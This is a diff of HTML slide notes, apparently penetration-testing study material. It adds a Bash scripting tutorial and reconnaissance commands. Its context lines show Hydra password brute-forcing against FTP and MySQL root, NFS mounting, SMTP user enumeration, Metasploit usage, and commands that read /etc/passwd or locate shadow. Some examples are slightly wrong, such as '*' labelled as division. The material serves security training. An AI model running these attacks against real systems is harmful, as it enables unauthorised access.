@@ -138,7 +138,7 @@ Daniel Hiller
 
 </div>
 <div id="basic-commands" class="slide section level3" number="1.3.1">
-<h1><span class="header-section-number">1.3.1</span> Basic commands</h1>
+<h1><span class="header-section-number">1.3.1</span> Basic Commands</h1>
 <table>
 <colgroup>
 <col width="50%" />
@@ -201,7 +201,7 @@ Daniel Hiller
 </tr>
 <tr class="odd">
 <td><code>who</code></td>
-<td>Displays who is logged in.</td>
+<td>Displays who are logged in.</td>
 </tr>
 <tr class="even">
 <td><code>env</code></td>
@@ -226,14 +226,8 @@ Daniel Hiller
 </tbody>
 </table>
 </div>
-<div id="bashscript" class="slide section level3" number="1.3.2">
-<h1><span class="header-section-number">1.3.2</span> Bashscript</h1>
-<p>Run a <code>bashscript</code> with persistent permissions:</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ./bashscript <span class="at">-p</span></span></code></pre></div>
-<pre class="text"><code>*(-p   = persists the permissions)</code></pre>
-</div>
-<div id="find" class="slide section level3" number="1.3.3">
-<h1><span class="header-section-number">1.3.3</span> FIND</h1>
+<div id="find" class="slide section level3" number="1.3.2">
+<h1><span class="header-section-number">1.3.2</span> FIND</h1>
 <p><code>find</code> search for files in a directory hierarchy:</p>
 <pre class="shell"><code>$ find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2&gt;/dev/null</code></pre>
 <pre><code>*(-type f               = defined the type of the searched object
@@ -244,31 +238,31 @@ Daniel Hiller
   -exec ls -al {} \;    = this option executes the specified command
   -2&gt;/dev/null          = this redirection ensures that no errors are displayed in the terminal)</code></pre>
 </div>
-<div id="filter-content" class="slide section level3" number="1.3.4">
-<h1><span class="header-section-number">1.3.4</span> Filter Content</h1>
+<div id="filter-content" class="slide section level3" number="1.3.3">
+<h1><span class="header-section-number">1.3.3</span> Filter Content</h1>
 <p><code>less</code> is file pager.</p>
 <p><code>sort</code> sort lines of text files.</p>
 <p><code>tr</code> translate or delete characters.</p>
 <p><code>column</code> columnate lists - to display results in tabular form use the flag <code>-t</code>.</p>
 <p><code>wc</code> print newline, word, and byte counts for each file - <code>-l</code> prints line counter</p>
-<h4 id="grep"><span class="header-section-number">1.3.4.1</span> Grep</h4>
+<h4 id="grep"><span class="header-section-number">1.3.3.1</span> Grep</h4>
 <p><code>grep</code> print lines matching a pattern. If we want to exclude a result we must use the <code>-v</code> flag.</p>
-<h4 id="cut"><span class="header-section-number">1.3.4.2</span> Cut</h4>
+<h4 id="cut"><span class="header-section-number">1.3.3.2</span> Cut</h4>
 <p><code>cut</code> remove sections from each line of files.</p>
 <pre class="shell"><code>$ cat /etc/passwd | grep -v &quot;false\|nologin&quot; | cut -d&quot;:&quot; -f1</code></pre>
 <pre><code>*(-d &quot;:&quot;     = Sets a delimiter at the character `:`
   -f1        = Selects only this field in our case the first one)</code></pre>
 </div>
-<div id="locate" class="slide section level3" number="1.3.5">
-<h1><span class="header-section-number">1.3.5</span> Locate</h1>
+<div id="locate" class="slide section level3" number="1.3.4">
+<h1><span class="header-section-number">1.3.4</span> Locate</h1>
 <p><code>locate</code> - find files by name</p>
 <p>Update the database for <code>locate</code>:</p>
 <pre class="shell"><code>$ sudo updatedb</code></pre>
 <p>Search for all files that end with <code>.conf</code></p>
 <pre class="shell"><code>$ locate *.conf</code></pre>
 </div>
-<div id="file-descriptors" class="slide section level3" number="1.3.6">
-<h1><span class="header-section-number">1.3.6</span> File Descriptors</h1>
+<div id="file-descriptors" class="slide section level3" number="1.3.5">
+<h1><span class="header-section-number">1.3.5</span> File Descriptors</h1>
 <ol style="list-style-type: decimal">
 <li>Data Stream for Input</li>
 </ol>
@@ -291,37 +285,503 @@ Daniel Hiller
 <pre class="shell"><code>$ find /etc/ -name shadow 2&gt; stderr.txt 1&gt; stdout.txt</code></pre>
 </div>
 
-<div id="exploiting-network-services" class="title-slide slide section level2" number="1.4">
-<h1><span class="header-section-number">1.4</span> Exploiting Network Services</h1>
+<div id="bash-scripting" class="title-slide slide section level2" number="1.4">
+<h1><span class="header-section-number">1.4</span> Bash Scripting</h1>
+<p>If we want to execute a bash script we can do this by the following command:</p>
+<pre class="shell"><code>$ &lt;interpreter&gt; script.sh &lt;optional arguments&gt;</code></pre>
+<p>Run a bash script with persistent permissions (<code>-p</code>):</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ./bashscript <span class="at">-p</span></span></code></pre></div>
+<p>In the first line we can specify the interpreter but if we call the script with another one, the defined in the <code>shebang</code> will be ignored:</p>
+<pre class="shell"><code>#!/bin/bash</code></pre>
+<p>This is also possible with other scripting languages like Python <code>#!/usr/bin/env python</code>. ### Conditional Execution</p>
+<p>The rough basic structure is as follows:</p>
+<pre class="shell"><code>if [[ -z &quot;$string&quot; ]]; then
+  echo &quot;String is empty&quot;
+elif [[ -n &quot;$string&quot; ]]; then
+  echo &quot;String is not empty&quot;
+fi</code></pre>
+</div>
+<h4 id="operators"><span class="header-section-number">1.4.0.1</span> Operators</h4>
+<p>String comparison operators “<code>&lt;</code> / <code>&gt;</code>” <strong>works only</strong> within the double square brackets <code>[[ &lt;condition&gt; ]]</code>.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>[[ -z STRING ]]</code></td>
+<td>Empty string</td>
+</tr>
+<tr class="even">
+<td><code>[[ -n STRING ]]</code></td>
+<td>Not empty string</td>
+</tr>
+<tr class="odd">
+<td><code>[[ STRING == STRING ]]</code></td>
+<td>Equal</td>
+</tr>
+<tr class="even">
+<td><code>[[ STRING != STRING ]]</code></td>
+<td>Not Equal</td>
+</tr>
+<tr class="odd">
+<td><code>[[ NUM -eq NUM ]]</code></td>
+<td>Equal</td>
+</tr>
+<tr class="even">
+<td><code>[[ NUM -ne NUM ]]</code></td>
+<td>Not equal</td>
+</tr>
+<tr class="odd">
+<td><code>[[ NUM -lt NUM ]]</code></td>
+<td>Less than</td>
+</tr>
+<tr class="even">
+<td><code>[[ NUM -le NUM ]]</code></td>
+<td>Less than or equal</td>
+</tr>
+<tr class="odd">
+<td><code>[[ NUM -gt NUM ]]</code></td>
+<td>Greater than</td>
+</tr>
+<tr class="even">
+<td><code>[[ NUM -ge NUM ]]</code></td>
+<td>Greater than or equal</td>
+</tr>
+<tr class="odd">
+<td><code>[[ -o noclobber ]]</code></td>
+<td>If OPTIONNAME is enabled</td>
+</tr>
+<tr class="even">
+<td><code>[[ ! EXPR ]]</code></td>
+<td>Not</td>
+</tr>
+<tr class="odd">
+<td><code>[[ X &amp;&amp; Y ]]</code></td>
+<td>And</td>
+</tr>
+<tr class="even">
+<td><code>[[ X || Y ]]</code></td>
+<td>Or</td>
+</tr>
+<tr class="odd">
+<td><code>[[ STRING =~ STRING ]]</code></td>
+<td>Regexp</td>
+</tr>
+<tr class="even">
+<td><code>(( NUM &lt; NUM ))</code></td>
+<td>Numeric conditions</td>
+</tr>
+</tbody>
+</table>
+<h4 id="file-operators"><span class="header-section-number">1.4.0.2</span> File Operators</h4>
+<table>
+<thead>
+<tr class="header">
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>[[ -e FILE ]]</code></td>
+<td>Exists</td>
+</tr>
+<tr class="even">
+<td><code>[[ -r FILE ]]</code></td>
+<td>Readable</td>
+</tr>
+<tr class="odd">
+<td><code>[[ -h FILE ]]</code></td>
+<td>Symlink</td>
+</tr>
+<tr class="even">
+<td><code>[[ -d FILE ]]</code></td>
+<td>Directory</td>
+</tr>
+<tr class="odd">
+<td><code>[[ -w FILE ]]</code></td>
+<td>Writable</td>
+</tr>
+<tr class="even">
+<td><code>[[ -s FILE ]]</code></td>
+<td>Size is &gt; 0 bytes</td>
+</tr>
+<tr class="odd">
+<td><code>[[ -f FILE ]]</code></td>
+<td>File</td>
+</tr>
+<tr class="even">
+<td><code>[[ -x FILE ]]</code></td>
+<td>Executable</td>
+</tr>
+<tr class="odd">
+<td><code>[[ FILE1 -nt FILE2 ]]</code></td>
+<td>1 is more recent than 2</td>
+</tr>
+<tr class="even">
+<td><code>[[ FILE1 -ot FILE2 ]]</code></td>
+<td>2 is more recent than 1</td>
+</tr>
+<tr class="odd">
+<td><code>[[ FILE1 -ef FILE2 ]]</code></td>
+<td>Same files</td>
+</tr>
+</tbody>
+</table>
+<div id="arguments" class="slide section level3" number="1.4.1">
+<h1><span class="header-section-number">1.4.1</span> Arguments</h1>
+<p>It is possible to pass up to 9 arguments (<code>$0</code>-<code>$9</code>) to a script:</p>
+<pre class="shell"><code>            $ ./script.sh ARG1 ARG2 ARG3 ... ARG9
+ASSIGNMENTS:       $0      $1   $2   $3 ...   $9</code></pre>
+</div>
+<div id="special-variables" class="slide section level3" number="1.4.2">
+<h1><span class="header-section-number">1.4.2</span> Special Variables</h1>
+<table>
+<colgroup>
+<col width="50%" />
+<col width="50%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>$#</code></td>
+<td>This variable holds the number of arguments passed to the script.</td>
+</tr>
+<tr class="even">
+<td><code>$@</code></td>
+<td>This variable can be used to retrieve the list of command-line arguments.</td>
+</tr>
+<tr class="odd">
+<td><code>$n</code></td>
+<td>Each command-line argument can be selectively retrieved using its position. For example, the first argument is found at <code>$1</code>.</td>
+</tr>
+<tr class="even">
+<td><code>$$</code></td>
+<td>The process ID of the currently executing process.</td>
+</tr>
+<tr class="odd">
+<td><code>$?</code></td>
+<td>The exit status of the script. This variable is useful to determine a command’s success. The value 0 represents successful execution, while 1 is a result of a failure.</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div id="variables" class="slide section level3" number="1.4.3">
+<h1><span class="header-section-number">1.4.3</span> Variables</h1>
+<p>It is important that when assigning a variable there is <strong>no space</strong> around the equal sign:</p>
+<pre class="shell"><code>variable=&quot;test&quot;</code></pre>
+</div>
+<div id="arrays" class="slide section level3" number="1.4.4">
+<h1><span class="header-section-number">1.4.4</span> Arrays</h1>
+<p>The values in the array are separated by spaces. If we want to escape these spaces, we can use single quotes (<code>&#39;</code>…<code>&#39;</code>) or double quotes (<code>&quot;</code>…<code>&quot;</code>).</p>
+<pre class="shell"><code>#!/bin/bash
+
+domains=(www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com www2.inlanefreight.com)
+
+echo ${domains[0]}</code></pre>
+</div>
+<div id="arithmetic" class="slide section level3" number="1.4.5">
+<h1><span class="header-section-number">1.4.5</span> Arithmetic</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Operator</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>+</code></td>
+<td>Addition</td>
+</tr>
+<tr class="even">
+<td><code>-</code></td>
+<td>Subtraction</td>
+</tr>
+<tr class="odd">
+<td><code>*</code></td>
+<td>Division</td>
+</tr>
+<tr class="even">
+<td><code>%</code></td>
+<td>Modulus</td>
+</tr>
+<tr class="odd">
+<td><code>variable++</code></td>
+<td>Increase the value of the variable by 1</td>
+</tr>
+<tr class="even">
+<td><code>variable--</code></td>
+<td>Decrease the value of the variable by 1</td>
+</tr>
+</tbody>
+</table>
+<p>We can also calculate the length of the variable. Using this function <code>${#variable}</code>, every character gets counted, and we get the total number of characters in the variable.</p>
+</div>
+<div id="input-control" class="slide section level3" number="1.4.6">
+<h1><span class="header-section-number">1.4.6</span> Input Control</h1>
+<p>Read input from the user, while the script is running:</p>
+<pre class="shell"><code>read -p &quot;Select your option: &quot; opt</code></pre>
+<pre><code>*(-p    = Ensures that our input remains on the same line
+  opt   = The input will be stored in the variable opt)</code></pre>
+</div>
+<div id="output-control" class="slide section level3" number="1.4.7">
+<h1><span class="header-section-number">1.4.7</span> Output Control</h1>
+<p>In some cases the scripts take longer time and the user don’t have any feedback. To solve this problem we can use <code>tee</code>, which enables us to write something to a file and also returning it as standard output:</p>
+<pre class="shell"><code>netrange=$(whois $ip | grep &quot;NetRange\|CIDR&quot; | tee -a CIDR.txt)</code></pre>
+<pre><code>*(-a   = Append to the given FILEs, do not overwrite)</code></pre>
+</div>
+<div id="loops" class="slide section level3" number="1.4.8">
+<h1><span class="header-section-number">1.4.8</span> Loops</h1>
+<h4 id="for-loops"><span class="header-section-number">1.4.8.1</span> For Loops</h4>
+<p>The idea behind for loops is that we iterate over something, or we have a limit how often the loop should run.</p>
+<p><em>Syntax - Examples</em></p>
+<pre class="shell"><code>for $variable in 1 2 3 4
+do
+    echo $variable
+done
+
+
+for $variable in file1 file2 file3
+do
+    echo $variable
+done
+
+
+for ip in &quot;10.10.10.170 10.10.10.174 10.10.10.175&quot;
+do
+    ping -c 1 $ip
+done</code></pre>
+<h4 id="while-loops"><span class="header-section-number">1.4.8.2</span> While Loops</h4>
+<p>The while loop will be executed as long the condition is fulfilled. There are two keywords available which gives us more control over the while loop.</p>
+<ul>
+<li><code>break</code> → Interrupts the loop</li>
+<li><code>continue</code> → Immediately continues with the next loop run</li>
+</ul>
+<p><em>Syntax - Examples</em></p>
+<pre class="shell"><code>#!/bin/bash
+
+counter=0
+
+while [ $counter -lt 10 ]
+do
+  # Increase $counter by 1
+  ((counter++))
+  echo &quot;Counter: $counter&quot;
+
+  if [ $counter == 2 ]
+  then
+    continue
+  elif [ $counter == 4 ]
+  then
+    break
+  fi
+done</code></pre>
+<h4 id="until-loops"><span class="header-section-number">1.4.8.3</span> Until Loops</h4>
+<p>Nevertheless, the until loop works precisely like the while loop, but with the difference:</p>
+<ul>
+<li>The code inside an until loop is executed as long as the particular condition is false</li>
+</ul>
+</div>
+<div id="switch-case" class="slide section level3" number="1.4.9">
+<h1><span class="header-section-number">1.4.9</span> Switch case</h1>
+<p>The keyword for a switch-case-statement starts with the keyword <code>case</code>, followed by the variable or value as an expression, which is then compared in the pattern. If the variable or value matches the expression, then the statements are executed after the parenthesis and ended with a double semicolon (<code>;;</code>).</p>
+<p><em>Syntax - Examples</em></p>
+<pre class="shell"><code>read -p &quot;Select your option: &quot; opt
+
+case $opt in
+    &quot;1&quot;) network_range ;;
+    &quot;2&quot;) ping_host ;;
+    &quot;3&quot;) network_range &amp;&amp; ping_host ;;
+    &quot;*&quot;) exit 0 ;;
+esac</code></pre>
+</div>
+<div id="functions" class="slide section level3" number="1.4.10">
+<h1><span class="header-section-number">1.4.10</span> Functions</h1>
+<p>The definition of a function is at the beginning of a bash script this ensures that it is already defined before it is called.</p>
+<p><em>Syntax - Examples</em></p>
+<pre class="shell"><code># Method 1 - Functions
+
+function name {
+    &lt;commands&gt;
+}
+
+# Method 2 - Functions
+
+name() {
+    &lt;commands&gt;
+}</code></pre>
+<p>The function is called only by calling the specified name of the function.</p>
+<h4 id="parameter-passing"><span class="header-section-number">1.4.10.1</span> Parameter Passing</h4>
+<p>In principle, the same applies to the passed parameters as to parameters passed to a shell script. These are <code>$1</code> - <code>$9</code> (<code>${n}</code>), or <code>$variable</code> as we have already seen. Each function has its own set of parameters. So they do not collide with those of other functions or the parameters of the shell script</p>
+<p><em>Syntax - Examples</em></p>
+<pre class="shell"><code>#!/bin/bash
+
+function print_pars {
+    echo $1 $2 $3
+}
+
+one=&quot;First parameter&quot;
+two=&quot;Second parameter&quot;
+three=&quot;Third parameter&quot;
+
+print_pars &quot;$one&quot; &quot;$two&quot; &quot;$three&quot;</code></pre>
+<h4 id="return-values"><span class="header-section-number">1.4.10.2</span> Return Values</h4>
+<p>Like our bash script, the functions return status codes:</p>
+<table>
+<thead>
+<tr class="header">
+<th>Return Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>1</code></td>
+<td>General errors</td>
+</tr>
+<tr class="even">
+<td><code>2</code></td>
+<td>Misuse of shell builtins</td>
+</tr>
+<tr class="odd">
+<td><code>126</code></td>
+<td>Command invoked cannot execute</td>
+</tr>
+<tr class="even">
+<td><code>127</code></td>
+<td>Command not found</td>
+</tr>
+<tr class="odd">
+<td><code>128</code></td>
+<td>Invalid argument to exit</td>
+</tr>
+<tr class="even">
+<td><code>128+n</code></td>
+<td>Fatal error signal “<code>n</code>”</td>
+</tr>
+<tr class="odd">
+<td><code>130</code></td>
+<td>Script terminated by Control-C</td>
+</tr>
+<tr class="even">
+<td><code>255\*</code></td>
+<td>Exit status out of range</td>
+</tr>
+</tbody>
+</table>
+<p>To get the value of a function back, we can use several methods like <code>return</code>, <code>echo</code>, or a <code>variable</code>.</p>
+<p><em>Syntax - Examples</em></p>
+<pre class="shell"><code>#!/bin/bash
+
+function given_args {
+
+        if [ $# -lt 1 ]
+        then
+                echo -e &quot;Number of arguments: $#&quot;
+                return 1
+        else
+                echo -e &quot;Number of arguments: $#&quot;
+                return 0
+        fi
+}
+
+# No arguments given
+given_args
+echo -e &quot;Function status code: $?\n&quot;
+
+# One argument given
+given_args &quot;argument&quot;
+echo -e &quot;Function status code: $?\n&quot;
+
+# Pass the results of the funtion into a variable
+content=$(given_args &quot;argument&quot;)
+
+echo -e &quot;Content of the variable: \n\t$content&quot;</code></pre>
+</div>
+<div id="debugging" class="slide section level3" number="1.4.11">
+<h1><span class="header-section-number">1.4.11</span> Debugging</h1>
+<p>Bash allows us to debug our code by using the “<code>-x</code>” (<code>xtrace</code>) and “<code>-v</code>” (<code>verbose</code>) options.</p>
+</div>
+<div id="cheat-sheet" class="slide section level3" number="1.4.12">
+<h1><span class="header-section-number">1.4.12</span> Cheat Sheet</h1>
+<p>For more information about bash scripting have a look in the following cheat sheet: https://devhints.io/bash ## Information Gathering ### Passive Information Gathering</p>
+<p><code>whois</code> can be used for querying domain names, IP addresses, or autonomous systems.</p>
+<h4 id="dig"><span class="header-section-number">1.4.12.1</span> DIG</h4>
+<p><code>dig</code> is a DNS lookup utility.</p>
+<p><code>WaybackMachine</code> is an American digital library that provides free public access to digitalized materials, including websites, collected automatically via its web crawlers.</p>
+<pre class="shell"><code>$ dig any google.com @8.8.8.8</code></pre>
+<pre><code>*(any         = query all types of records
+  @8.8.8.8    = define a dns server from which you wnat to retrieve the information)</code></pre>
+<h4 id="project-sonar"><span class="header-section-number">1.4.12.2</span> Project Sonar</h4>
+<p>To find all available subdomains we can use <code>Project Sonar</code>:</p>
+<pre class="shell"><code>$ curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r &#39;.[]&#39; | sort -u</code></pre>
+<h4 id="certificates"><span class="header-section-number">1.4.12.3</span> Certificates</h4>
+<p>To gain more information we can search for certificates at sites like <code>https://crt.sh</code> and <code>https://search.censys.io/certificates</code>.</p>
+</div>
+<div id="active-information-gathering" class="slide section level3" number="1.4.13">
+<h1><span class="header-section-number">1.4.13</span> Active Information Gathering</h1>
+<p><code>Wappalyzer</code> is a browser extension which finds out what technologies are used on a website.</p>
+<p><code>WAFW00F</code> is a Web Application Firewall Fingerprinting Tool.</p>
+<p><code>Aquatone</code> is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.</p>
+<h4 id="http-header"><span class="header-section-number">1.4.13.1</span> HTTP Header</h4>
+<p>We can gain information about the version of the web server and the operating system with the curl flag <code>-I</code> which returns us the <code>http header</code>:</p>
+<pre class="shell"><code>$ curl -I &quot;http://${TARGET}&quot;</code></pre>
+<p><code>X-Powered-By header</code> can tell us what the web app is using. We can see values like PHP, ASP.NET, JSP, etc.</p>
+<p><code>Cookies</code> are another value to look at as each technology by default has its cookies. Some default cookie values are:</p>
+<ul>
+<li>.NET: ASPSESSIONID<RANDOM>=<COOKIE_VALUE></li>
+<li>PHP: PHPSESSID=<COOKIE_VALUE></li>
+<li>JAVA: JSESSION=<COOKIE_VALUE></li>
+</ul>
+<h4 id="whatweb"><span class="header-section-number">1.4.13.2</span> WhatWeb</h4>
+<p><code>WhatWeb</code> is a Web scanner - identify technologies used by websites.</p>
+<pre class="shell"><code>$ whatweb -a 1 https://www.facebook.com -v</code></pre>
+<pre><code>*(-a    = Set the aggression level. 1(low) - 4(high) 
+  -v    = verbose)</code></pre>
+<!-- USE wafwoof to detect the CMS!!! -->
+</div>
+
+<div id="exploiting-network-services" class="title-slide slide section level2" number="1.5">
+<h1><span class="header-section-number">1.5</span> Exploiting Network Services</h1>
 
 </div>
-<div id="github-repos" class="slide section level3" number="1.4.1">
-<h1><span class="header-section-number">1.4.1</span> GitHub Repos</h1>
+<div id="github-repos" class="slide section level3" number="1.5.1">
+<h1><span class="header-section-number">1.5.1</span> GitHub Repos</h1>
 <p>SecLists: https://github.com/danielmiessler/SecLists</p>
 </div>
-<div id="ssh" class="slide section level3" number="1.4.2">
-<h1><span class="header-section-number">1.4.2</span> SSH</h1>
+<div id="ssh" class="slide section level3" number="1.5.2">
+<h1><span class="header-section-number">1.5.2</span> SSH</h1>
 <p>Authenticate via ssh with the key-file <code>id_rsa</code>:</p>
-<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ssh <span class="at">-i</span> id_rsa user@10.10.10.10</span></code></pre></div>
+<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ssh <span class="at">-i</span> id_rsa user@10.10.10.10</span></code></pre></div>
 <pre class="text"><code>*(-i [file]  = Identity file)</code></pre>
 </div>
-<div id="nmap" class="slide section level3" number="1.4.3">
-<h1><span class="header-section-number">1.4.3</span> NMAP</h1>
+<div id="nmap" class="slide section level3" number="1.5.3">
+<h1><span class="header-section-number">1.5.3</span> NMAP</h1>
 <p>Checks open ports in defined range and check running services with <code>Nmap</code>:</p>
-<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap 10.10.221.8 <span class="at">-sV</span> <span class="at">-p</span> 0-60000</span></code></pre></div>
+<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap 10.10.221.8 <span class="at">-sV</span> <span class="at">-p</span> 0-60000</span></code></pre></div>
 <pre class="text"><code>*(-p-  = Scans the whole portrange
   -p   = Specific port or portrange
   -sV  = Attempts to determine the version of the service running on port
   -A   = Enables OS detection, version detection, script scanning and traceroute)</code></pre>
 </div>
-<div id="ftp" class="slide section level3" number="1.4.4">
-<h1><span class="header-section-number">1.4.4</span> FTP</h1>
+<div id="ftp" class="slide section level3" number="1.5.4">
+<h1><span class="header-section-number">1.5.4</span> FTP</h1>
 <p>Download a File from an FTP-Server with <code>Wget</code>:</p>
-<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> wget <span class="at">-m</span> ftp://user:password@ftp.example.com</span></code></pre></div>
+<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> wget <span class="at">-m</span> ftp://user:password@ftp.example.com</span></code></pre></div>
 <pre class="text"><code>*(-m = --mirror)</code></pre>
-<h4 id="hydra"><span class="header-section-number">1.4.4.1</span> Hydra</h4>
+<h4 id="hydra"><span class="header-section-number">1.5.4.1</span> Hydra</h4>
 <p>Use <code>Hydra</code> for cracking password in our example on an FTP-Service:</p>
-<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> hydra <span class="at">-t</span> 4 <span class="at">-l</span> dale <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.10.6 ftp</span></code></pre></div>
+<div class="sourceCode" id="cb39"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> hydra <span class="at">-t</span> 4 <span class="at">-l</span> dale <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.10.6 ftp</span></code></pre></div>
 <pre class="text"><code>*(-t 4      = Number of parallel connections per target
   -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
   -P [file] = Points to the file containing the list of possible passwords
@@ -329,27 +789,27 @@ Daniel Hiller
   [IP]      = The IP address of the target machine
   [ftp]     = Sets the protocol)</code></pre>
 </div>
-<div id="nfs" class="slide section level3" number="1.4.5">
-<h1><span class="header-section-number">1.4.5</span> NFS</h1>
+<div id="nfs" class="slide section level3" number="1.5.5">
+<h1><span class="header-section-number">1.5.5</span> NFS</h1>
 <p>List name or <code>NFS</code> shares:</p>
-<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> /usr/sbin/showmount <span class="at">-e</span> [IP]</span></code></pre></div>
+<div class="sourceCode" id="cb41"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> /usr/sbin/showmount <span class="at">-e</span> [IP]</span></code></pre></div>
 <pre class="text"><code>*(-e    = Shows the NSF server&#39;s export list
   [IP]  = The IP Address of the NFS server)</code></pre>
 <p>Connect <code>NFS</code> share with mount point on our machine:</p>
-<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> sudo mount <span class="at">-t</span> nfs IP:share /tmp/mount/ <span class="at">-nolock</span></span></code></pre></div>
+<div class="sourceCode" id="cb43"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> sudo mount <span class="at">-t</span> nfs IP:share /tmp/mount/ <span class="at">-nolock</span></span></code></pre></div>
 <pre class="text"><code>*(-t nfs    = Type of device to mount, then specifying that it&#39;s NFS
   IP:share  = The IP Address of the NFS server, and the name of the share we wish to mount
   -nolock   = Specifies not to use NLM locking)</code></pre>
 </div>
-<div id="smtp" class="slide section level3" number="1.4.6">
-<h1><span class="header-section-number">1.4.6</span> SMTP</h1>
+<div id="smtp" class="slide section level3" number="1.5.6">
+<h1><span class="header-section-number">1.5.6</span> SMTP</h1>
 <p>There are three relevant commands, when it comes to <code>SMTP</code>:</p>
 <pre class="text"><code>(VRFY    = Confirming the names of valid users
  EXPN    = Reveals the actual address of user’s aliases and lists of e-mail (mailing lists)
  RCPT TO = Specifies the e-mail address of the recipient)</code></pre>
 </div>
-<div id="metasploit" class="slide section level3" number="1.4.7">
-<h1><span class="header-section-number">1.4.7</span> Metasploit</h1>
+<div id="metasploit" class="slide section level3" number="1.5.7">
+<h1><span class="header-section-number">1.5.7</span> Metasploit</h1>
 <pre class="text"><code>*(search [name]                 = Search for a module and his description
   use [name]                    = Selects a module by name
   options                       = When a module is selected we will see the options of the module
@@ -357,10 +817,10 @@ Daniel Hiller
   run                           = Run the exploit)</code></pre>
 <p>For further information see the following documentation: https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/</p>
 </div>
-<div id="mysql" class="slide section level3" number="1.4.8">
-<h1><span class="header-section-number">1.4.8</span> MySQL</h1>
+<div id="mysql" class="slide section level3" number="1.5.8">
+<h1><span class="header-section-number">1.5.8</span> MySQL</h1>
 <p>First we need a client, which is in our case <code>default-mysql-client</code>:</p>
-<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
+<div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
 <pre class="text"><code>*(-h [IP]        = Connect to the MariaDB server on the given host
   -u [username]  = The MariaDB user name to use when connecting to the server
   -p             = The password to use when connecting to the server)</code></pre>
@@ -370,7 +830,7 @@ $ nmap --script=mysql-enum [target]</code></pre>
 <pre class="text"><code>*(--script=mysql-enum           = Scan with a single script: mysql-enum
   [target]                      = The IP address of the target)</code></pre>
 <p>Now that we know some usernames of the database, we can try to crack the passwords of them with <code>Hydra</code>:</p>
-<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
